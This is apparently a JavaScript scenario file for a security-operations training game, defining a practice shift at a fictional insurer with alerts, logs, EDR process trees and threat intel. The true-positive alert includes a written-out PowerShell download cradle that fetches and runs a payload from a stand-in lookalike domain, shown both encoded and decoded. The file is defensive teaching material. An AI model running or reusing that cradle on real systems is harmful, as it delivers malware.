(function () {
  // Training sim used only by the tutorials (tutorial:true hides it from the shift list and speeds up replies).
  const b64u16 = s => { let b = ''; for (const c of s) { const n = c.charCodeAt(0); b += String.fromCharCode(n & 255, n >> 8); } return btoa(b); };
  const CRADLE = "IEX (New-Object Net.WebClient).DownloadString('https://careers-docs-portal.example/a/payload.ps1')";
  const ENC = b64u16(CRADLE);
  const E = (id, t, source, hostId, event, msg, fields = {}, o = {}) => Object.assign({ id, t, source, hostId, event, msg, fields }, o);
  const H = (id, hostname, ip, os, type, userId, dept, criticality) => ({ id, hostname, ip, os, type, userId, dept, criticality, agent: '7.4.1' });

  window.SOC_SCENARIOS.push({
    id: 's0-training', tutorial: true, title: 'Training Shift', tagline: 'Practice shift used by the tutorials.', difficulty: 'Tutorial', date: '2026-11-02',
    shift: { start: '08:00', end: '17:00' },
    company: { name: 'Cobalt Lake Insurance', domain: 'cobaltlake-ins.example', industry: 'Insurance', blurb: 'Small regional insurer used for training.' },
    handover: [
      'Welcome to training mode. Nothing here is real and you cannot fail.',
      'Colleagues reply in seconds instead of minutes so you can learn the flow quickly.',
      'The weekly vulnerability scan from SCAN01 runs on Mondays 08:00-09:00 (CHG-100).',
      'Escalate to T2 (Bob/Priya) when unsure. IR (Marcus/Imani) when you have confirmed compromise.'
    ].join('\n'),
    users: [
      { id: 'u-bortiz', name: 'Ben Ortiz', username: 'bortiz', email: 'bortiz@cobaltlake-ins.example', dept: 'Sales', title: 'Sales Representative', manager: 'Gail Navarro', location: 'Main office' },
      { id: 'u-cdunn', name: 'Carla Dunn', username: 'cdunn', email: 'cdunn@cobaltlake-ins.example', dept: 'HR', title: 'HR Coordinator', manager: 'Meera Shah', location: 'Main office' },
      { id: 'u-mshah', name: 'Meera Shah', username: 'mshah', email: 'mshah@cobaltlake-ins.example', dept: 'HR', title: 'HR Director', manager: '', location: 'Main office' },
      { id: 'u-ltran', name: 'Lan Tran', username: 'ltran', email: 'ltran@cobaltlake-ins.example', dept: 'IT', title: 'IT Administrator', manager: '', location: 'Main office' }
    ],
    hosts: [
      H('h-dc01', 'DC01', '10.10.1.10', 'Windows Server 2022', 'dc', null, 'IT', 'crown'),
      H('h-fs01', 'FS01', '10.10.1.21', 'Windows Server 2019', 'server', null, 'IT', 'high'),
      H('h-mail01', 'MAIL01', '10.10.1.30', 'Windows Server 2019', 'server', null, 'IT', 'medium'),
      H('h-scan01', 'SCAN01', '10.10.9.15', 'Windows Server 2022', 'server', null, 'IT', 'medium'),
      H('h-sal-01', 'SAL-WS-01', '10.10.5.11', 'Windows 11 Pro', 'workstation', 'u-bortiz', 'Sales', 'low'),
      H('h-hr-05', 'HR-LT-05', '10.10.7.25', 'Windows 11 Pro', 'laptop', 'u-cdunn', 'HR', 'medium'),
      H('h-hr-06', 'HR-WS-06', '10.10.7.26', 'Windows 11 Pro', 'workstation', 'u-mshah', 'HR', 'medium'),
      H('h-it-02', 'IT-WS-02', '10.10.9.52', 'Windows 11 Pro', 'workstation', 'u-ltran', 'IT', 'medium')
    ],
    alerts: [
      {
        id: 'A-0001', at: '08:00', title: 'Multiple failed logons followed by a successful logon', severity: 'low', source: 'SIEM', rule: 'AUTH-014 Failed logon burst + success', hostId: 'h-sal-01', userId: 'u-bortiz',
        summary: '3 failed interactive logons for bortiz on SAL-WS-01 followed by a successful logon.',
        details: { 'Failed logons': '3', 'Window': '07:52 - 07:56', 'Account': 'bortiz', 'Source': 'SAL-WS-01 (local console)' },
        eventIds: ['e-t101', 'e-t102', 'e-t103', 'e-t104', 'e-t105'], iocs: [{ type: 'user', value: 'bortiz' }, { type: 'host', value: 'SAL-WS-01' }], truth: 'FP',
        explain: 'The user forgot their password. IT reset it (event 4724, ticket INC-5001) between the failures and the successful logon, all from his own workstation.',
        reply: { fp: 'Ben forgot his password. Lan reset it at 07:55 (4724, INC-5001) and the successful logon follows from his own desk.' },
        keywords: ['failed', 'logon', 'reset', 'bortiz'],
        userReply: 'Yes, I forgot my password this morning and IT reset it for me.', helpdeskReply: 'Yep, Lan reset Ben\'s password at 07:55 under INC-5001.'
      },
      {
        id: 'A-0002', at: '08:03', title: 'Internal network scan detected', severity: 'medium', source: 'NDR', rule: 'NDR-221 Horizontal port scan', hostId: 'h-scan01',
        summary: 'Host 10.10.9.15 probed 90 internal hosts on common ports in 3 minutes.',
        details: { 'Source': '10.10.9.15 (SCAN01)', 'Targets': '90 hosts', 'Ports': '22, 135, 445, 3389', 'Duration': '3 min' },
        eventIds: ['e-t110', 'e-t111', 'e-t112', 'e-t113'], iocs: [{ type: 'ip', value: '10.10.9.15' }, { type: 'host', value: 'SCAN01' }], truth: 'FP',
        explain: 'SCAN01 is the corporate vulnerability scanner running the scheduled weekly scan (CHG-100, 08:00-09:00) with its service account.',
        reply: { fp: 'That source is SCAN01, our vulnerability scanner. The weekly scan is on the change calendar (CHG-100) and svc-tenable logged in at 08:00.' },
        keywords: ['scan', 'scan01', '10.10.9.15', 'port']
      },
      {
        id: 'A-0003', at: '08:15', title: 'Office application spawned hidden PowerShell', severity: 'high', source: 'EDR', rule: 'EDR-0412 Office child process', hostId: 'h-hr-05', userId: 'u-cdunn',
        summary: 'WINWORD.EXE launched powershell.exe with a hidden window and an encoded command on HR-LT-05.',
        details: { 'Process': 'powershell.exe -w hidden -nop -enc', 'Parent chain': 'OUTLOOK.EXE > WINWORD.EXE > powershell.exe', 'User': 'CORP\\cdunn', 'Destination': 'careers-docs-portal.example', 'Window': 'Hidden' },
        eventIds: ['e-t201', 'e-t203', 'e-t204', 'e-t205', 'e-t206'],
        iocs: [{ type: 'domain', value: 'careers-docs-portal.example' }, { type: 'ip', value: '203.0.113.60' }, { type: 'email', value: 'jporter.careers@talent-bridge-hr.example' }], truth: 'TP', incident: 'INC-1',
        explain: 'TRUE POSITIVE. A fake job-application email (SPF/DMARC fail) carried a macro-enabled Word document. Word spawned a hidden, encoded PowerShell that downloaded a payload from a newly registered lookalike domain and started a beacon. Word should never launch PowerShell.',
        reply: { tp: 'Resume lure with a macro document (SPF and DMARC failed). Word launches hidden encoded PowerShell, which pulls a payload from careers-docs-portal.example. That is a real initial-access attack.', irTp: 'Macro doc to hidden encoded PowerShell to a payload download from a fresh domain. I\'m treating HR-LT-05 as compromised.' },
        keywords: ['word', 'powershell', 'encoded', 'hidden', 'macro', 'careers-docs-portal', 'resume'],
        userReply: 'A candidate emailed a resume for the claims job. Word asked me to enable content so I clicked it, but nothing opened.', helpdeskReply: 'Carla called, she says a resume document did nothing weird-looking. I asked her not to open anything else.'
      }
    ],
    events: [
      E('e-t101', '07:52:10', 'WinEvent', 'h-sal-01', '4625 Logon failed', 'EventID=4625 LogonType=2 TargetUserName=bortiz WorkstationName=SAL-WS-01 FailureReason=Unknown user name or bad password Status=0xC000006A', { code: '4625' }, { user: 'bortiz' }),
      E('e-t102', '07:52:40', 'WinEvent', 'h-sal-01', '4625 Logon failed', 'EventID=4625 LogonType=2 TargetUserName=bortiz WorkstationName=SAL-WS-01 FailureReason=Unknown user name or bad password Status=0xC000006A', { code: '4625' }, { user: 'bortiz' }),
      E('e-t103', '07:53:20', 'WinEvent', 'h-sal-01', '4625 Logon failed', 'EventID=4625 LogonType=2 TargetUserName=bortiz WorkstationName=SAL-WS-01 FailureReason=Unknown user name or bad password Status=0xC000006A', { code: '4625' }, { user: 'bortiz' }),
      E('e-t104', '07:55:10', 'WinEvent', 'h-dc01', '4724 Password reset', 'EventID=4724 An attempt was made to reset an account\'s password. Subject: CORP\\ltran Target: CORP\\bortiz Ticket=INC-5001', { code: '4724', ticket: 'INC-5001' }, { user: 'ltran' }),
      E('e-t105', '07:56:02', 'WinEvent', 'h-sal-01', '4624 Logon', 'EventID=4624 LogonType=2 TargetUserName=bortiz WorkstationName=SAL-WS-01 Status=Success', { code: '4624', logontype: '2' }, { user: 'bortiz' }),
      E('e-t110', '08:00:02', 'WinEvent', 'h-scan01', '4624 Logon', 'EventID=4624 LogonType=3 TargetUserName=svc-tenable SourceNetworkAddress=10.10.9.15 Status=Success (credentialed scan service account)', { code: '4624' }, { user: 'svc-tenable', src: '10.10.9.15' }),
      E('e-t111', '08:00:40', 'Firewall', 'h-scan01', 'Allow', 'ALLOW TCP 10.10.9.15:51022 -> 10.10.7.25:445 bytes=2140 app=smb', { action: 'allow', dport: '445' }, { src: '10.10.9.15', dst: '10.10.7.25' }),
      E('e-t112', '08:01:30', 'Firewall', 'h-scan01', 'Allow', 'ALLOW TCP 10.10.9.15:51190 -> 10.10.5.11:3389 bytes=960 app=ms-rdp', { action: 'allow', dport: '3389' }, { src: '10.10.9.15', dst: '10.10.5.11' }),
      E('e-t113', '08:02:30', 'NDR', 'h-scan01', 'Horizontal scan', 'NDR: horizontal port scan detected src=10.10.9.15 targets=90 hosts ports=22,135,445,3389 duration=3m', { count: '90' }, { src: '10.10.9.15' }),
      E('e-t201', '08:06:14', 'Email', 'h-mail01', 'Delivered', 'Delivered from=jporter.careers@talent-bridge-hr.example to=cdunn@cobaltlake-ins.example subject="Application: Senior Claims Analyst (resume attached)" attachment=Resume_J_Porter.docm spf=fail dkim=none dmarc=fail verdict=allowed', { sender: 'jporter.careers@talent-bridge-hr.example', recipient: 'cdunn@cobaltlake-ins.example', attachment: 'Resume_J_Porter.docm', spf: 'fail', dmarc: 'fail' }, { user: 'cdunn', src: '203.0.113.61' }),
      E('e-t202', '08:12:20', 'EDR', 'h-hr-05', 'FileCreate', 'FileCreate C:\\Users\\cdunn\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Resume_J_Porter.docm pid=2210 (OUTLOOK.EXE) mark-of-the-web=no', { process: 'OUTLOOK.EXE', path: 'Resume_J_Porter.docm' }, { user: 'cdunn' }),
      E('e-t203', '08:12:41', 'EDR', 'h-hr-05', 'ProcessCreate', 'WINWORD.EXE /n "Resume_J_Porter.docm" parent=OUTLOOK.EXE(2210) pid=3300', { process: 'WINWORD.EXE', parent: 'OUTLOOK.EXE' }, { user: 'cdunn' }),
      E('e-t204', '08:13:02', 'EDR', 'h-hr-05', 'ProcessCreate', 'powershell.exe -w hidden -nop -ep bypass -enc ' + ENC + ' parent=WINWORD.EXE(3300) pid=3388 flag=SUSPICIOUS', { process: 'powershell.exe', parent: 'WINWORD.EXE', encoded: 'yes', hidden: 'yes' }, { user: 'cdunn' }),
      E('e-t205', '08:13:05', 'DNS', 'h-hr-05', 'DNS Query', 'query: careers-docs-portal.example IN A from 10.10.7.25 -> 203.0.113.60 NOERROR', { domain: 'careers-docs-portal.example', answer: '203.0.113.60' }, { user: 'cdunn', src: '10.10.7.25', dst: '203.0.113.60' }),
      E('e-t206', '08:13:07', 'Proxy', 'h-hr-05', 'HTTP GET', '10.10.7.25 cdunn "GET https://careers-docs-portal.example/a/payload.ps1 HTTP/1.1" 200 31204 "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0)" cat="Uncategorized (newly seen)" action=allowed', { domain: 'careers-docs-portal.example', url: 'https://careers-docs-portal.example/a/payload.ps1', status: '200' }, { user: 'cdunn', dst: '203.0.113.60' }),
      E('e-t207', '08:13:30', 'Firewall', 'h-hr-05', 'Allow', 'ALLOW TCP 10.10.7.25:50712 -> 203.0.113.60:443 bytes=34870 app=ssl', { action: 'allow', dport: '443', domain: 'careers-docs-portal.example' }, { src: '10.10.7.25', dst: '203.0.113.60', user: 'cdunn' }),
      E('e-t208', '08:14:10', 'EDR', 'h-hr-05', 'ProcessCreate', 'rundll32.exe (no arguments) parent=powershell.exe(3388) pid=3402 flag=MALICIOUS', { process: 'rundll32.exe', parent: 'powershell.exe' }, { user: 'cdunn' })
    ],
    edr: {
      'h-hr-05': {
        processes: [
          { pid: 2100, ppid: 0, name: 'explorer.exe', cmd: 'C:\\Windows\\explorer.exe', user: 'CORP\\cdunn', start: '07:40:10', signed: true, publisher: 'Microsoft Corporation', flag: null },
          { pid: 2210, ppid: 2100, name: 'OUTLOOK.EXE', cmd: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', user: 'CORP\\cdunn', start: '07:41:00', signed: true, publisher: 'Microsoft Corporation', flag: null },
          { pid: 3300, ppid: 2210, name: 'WINWORD.EXE', cmd: 'WINWORD.EXE /n "Resume_J_Porter.docm"', user: 'CORP\\cdunn', start: '08:12:41', signed: true, publisher: 'Microsoft Corporation', flag: 'suspicious', note: 'Macro-enabled document opened from an email attachment' },
          { pid: 3388, ppid: 3300, name: 'powershell.exe', cmd: 'powershell.exe -w hidden -nop -ep bypass -enc ' + ENC, user: 'CORP\\cdunn', start: '08:13:02', signed: true, publisher: 'Microsoft Corporation', flag: 'malicious', note: 'Word should never launch PowerShell. Decoded: ' + CRADLE },
          { pid: 3402, ppid: 3388, name: 'rundll32.exe', cmd: 'C:\\Windows\\System32\\rundll32.exe', user: 'CORP\\cdunn', start: '08:14:10', signed: true, publisher: 'Microsoft Corporation', flag: 'malicious', note: 'No command line, outbound network, likely injected code' }
        ],
        connections: [
          { t: '08:13:07', pid: 3388, proc: 'powershell.exe', dst: '203.0.113.60:443', domain: 'careers-docs-portal.example', proto: 'TCP' },
          { t: '08:14:20', pid: 3402, proc: 'rundll32.exe', dst: '203.0.113.60:443', domain: 'careers-docs-portal.example', proto: 'TCP' }
        ],
        files: [{ t: '08:12:20', pid: 2210, op: 'create', path: 'C:\\Users\\cdunn\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\Resume_J_Porter.docm', sha256: '' }]
      }
    },
    intel: {
      'careers-docs-portal.example': { verdict: 'malicious', summary: 'Registered 1 day ago. Lookalike "careers portal" serving PowerShell payloads. Flagged malicious by 9 of 90 vendors.', source: 'VirusTotal / WHOIS' },
      '203.0.113.60': { verdict: 'malicious', summary: 'Hosts careers-docs-portal.example. Known payload and C2 host on a bulletproof hosting ASN.', source: 'OTX' },
      'talent-bridge-hr.example': { verdict: 'malicious', summary: 'Newly registered domain used to send fake job-application emails with macro documents.', source: 'Internal CTI' },
      'jporter.careers@talent-bridge-hr.example': { verdict: 'malicious', summary: 'Sender of the fake resume campaign. SPF and DMARC fail.', source: 'Internal CTI' },
      '10.10.9.15': { verdict: 'benign', summary: 'SCAN01, the corporate vulnerability scanner. Authorized scanner (CMDB tag vuln-mgmt).', source: 'CMDB' }
    },
    changes: [
      { at: '08:00', system: 'SCAN01', desc: 'Weekly authenticated vulnerability scan across the whole network. Window 08:00-09:00.', owner: 'Lan Tran', ticket: 'CHG-100' },
      { at: '18:00', system: 'FS01', desc: 'Monthly file server patching and reboot (after hours).', owner: 'Lan Tran', ticket: 'CHG-101' }
    ],
    chat: [
      { at: '08:02', from: 'sam', text: 'Training mode: colleagues reply in seconds, not minutes, so you can learn the flow.' }
    ]
  });
})();
